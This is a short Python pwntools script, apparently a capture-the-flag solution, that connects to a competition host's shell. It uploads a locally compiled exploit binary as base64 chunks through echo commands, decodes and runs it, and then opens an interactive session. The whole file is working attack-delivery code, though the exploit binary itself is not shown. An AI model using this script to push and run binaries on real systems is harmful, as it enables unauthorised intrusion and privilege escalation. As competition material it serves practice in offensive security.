from pwn import *
from os import system

system("./compile.sh")
system('tar -cf archive.tar like_expl')
system('cat archive.tar | base64 > archive.b64')

p = remote('hack.scythe2021.sdslabs.co', 17702)

def run(cmd):
    p.recvuntil('$')
    p.sendline(cmd)

run('cd ~')

ar = open('archive.b64', 'r').read()

sz = 4096*16
j = 0
for i in range(0, len(ar), sz):
    print(f"Sending chunk {j}/{len(ar)//sz+1}")
    j += 1
    chunk = ar[i:i+sz]

    cmd = f"echo -n \"{chunk}\" >> archive.b64"
    run(cmd)

run("ls -la && cat archive.b64 | base64 -d > archive.tar && tar -xf archive.tar && ls -la")
run("./like_expl")

p.interactive()
